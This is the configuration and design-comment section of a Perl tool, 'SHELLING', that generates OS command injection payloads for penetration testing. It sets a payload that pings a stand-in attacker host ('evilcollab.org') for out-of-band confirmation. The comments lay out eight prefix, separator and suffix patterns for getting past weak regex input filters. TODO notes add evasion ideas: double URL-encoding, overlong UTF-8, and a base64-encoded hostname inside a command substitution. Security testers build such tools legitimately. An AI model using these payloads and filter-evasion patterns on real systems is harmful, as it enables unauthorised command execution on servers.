## SHELLING - payload generator by ewilded, tuned for OS command injection

use strict;

# CONFIGURATION SECTION START
my $COMMAND='ping'; # sleep, echo, touch, wget, this could be nicely profiled, e.g. by a parameter called 'feedback_channel' or sth
my $ARGUMENT='xPAYLOAD_MARK.sub.evilcollab.org'; # 
# in this configuration example we are trying to ravage file upload mechanism in order to write arbitrary files to arbitrary location
my $PAYL=$COMMAND.'ARGUMENT_SEPARATOR'.$ARGUMENT;
my $payload_marking=1; # if  we want to mark each payload with a unique identifier, so we can know the winner when it hits the right place
my $TARGET_OS='win'; # other options include 'win' and 'all', 'nix' is the default

# Let's try to create proper nix command injection anatomy
## we can deal with three types of porly written check filters:
# 1) the ones that only force the string to begin properly, like ^\w+ 
# 2) the ones that only force the string to end properly, like \w+$
# 3) the ones that only force the string to have proper beginning and end, with a loophole inside of them, e.g. ^\w+\s+.*\w+$
# We have to create the base payloads list with this thing in mind
# This is why we need both SUFFIXES and PREFIXES, we build all combinations: PREFIX{PAYLOAD}, PREFIX{PAYLOAD}SUFFIX, {PAYLOAD}SUFFIX, we'll also be able to cover injection points starting/ending with quotes

# MALICIOUS_COMMAND=COMMAND+ARGUMENT_SEPARATOR
# THE COMBINATION PATTERNS: 
# 1) MALICIOUS_COMMAND (argument injections like `$USER_SUPPLIED` or $(USER_SUPPLIED))
# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed)
# 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND (for simple injections with no filtering, like cat $USER_SUPPLIED
# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended some fixed content, like 'some_binary $USER_SUPPLIED -someflag')
# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like 'cat $USER_SUPPLIED something', with filtering like \w+$)
# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with weak filtering like ^\w+ and some appended fixed content, like 'cat $USER_SUPPLIED something')
# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed content, like 'cat $USER_SUPPLIED something', with weak filtering like ^\w+\s+.*\w+$)
# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)

# Why we do not combine COMMAND_SEPARATORS along with COMMAND_TERMINATORS in one payload: any quotes will be handled by the prefix stuff anyway, while any fixed appendices will be ignored due to separators instead of terminators (and if separator is not accepted, the command will fail anyway, so there is no point in trailing it with a terminator)... hence, terminators should be used only mutually exclusively with separators!

# OTHER IDEAS (TODO)
# Additional evasive versions, e.g. double url-encode (or overlong utf) non-word characters (ARGUMENT_SEPARATORS, COMMAND_SEPARATORS, COMMAND_TERMINATORS)
# Generate test cases FROM the payloads
# Command line argument passing (to help automate payload generation)
# Result payloads ordered starting from the most probable ones, to optimize the number of requests sent
# Review and analyse the basic payload cases for any missing or faulty payloads
## Bad character avoidance; there have to be some alternative payloads evading filters for particular characters; for instance "ping shell.a.pentest.co" might fail if "." is not allowed; while "ping $((echo  c2hlbGwuYS5wZW50ZXN0LmNvLnVrCg==|base64 -d))" would work otherwise (provided that its other characers are not blocked ofc), it's just an example; we need to develop some sort of bad character evasion like in meterpreter encoder ;)
